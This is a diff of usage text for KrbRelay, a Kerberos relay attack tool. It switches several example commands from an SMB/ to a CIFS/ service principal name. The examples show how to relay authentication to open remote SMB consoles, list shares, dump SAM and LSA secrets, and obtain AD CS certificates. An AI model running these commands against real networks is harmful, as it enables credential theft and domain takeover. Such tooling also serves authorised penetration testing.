@@ -74,16 +74,16 @@ Options:
 
 Examples:
   Start an interactive SMB console:
-    KrbRelay.exe -spn SMB/target.domain.com -console -redirecthost <ip_target_host>
+    KrbRelay.exe -spn CIFS/target.domain.com -console -redirecthost <ip_target_host>
 
   List SMB shares on a target:
     KrbRelay.exe -spn SMB/target.domain.com -list
 
   Dump SAM & LSA secrets:
-    KrbRelay.exe -spn SMB/target.domain.com -secrets -redirecthost <ip_target_host>
+    KrbRelay.exe -spn CIFS/target.domain.com -secrets -redirecthost <ip_target_host>
 
   Start a background SMB console on port 10000 upon relay:
-    KrbRelay.exe -spn SMB/target.domain.com -bgconsole -redirecthost <ip_target_host>
+    KrbRelay.exe -spn CIFS/target.domain.com -bgconsole -redirecthost <ip_target_host>
 
   Generate a certificate using ADCS with a specific template:
     KrbRelay.exe -spn HTTP/target.domain.com -endpoint CertSrv -adcs UserTemplate-redirecthost <ip_target_host>
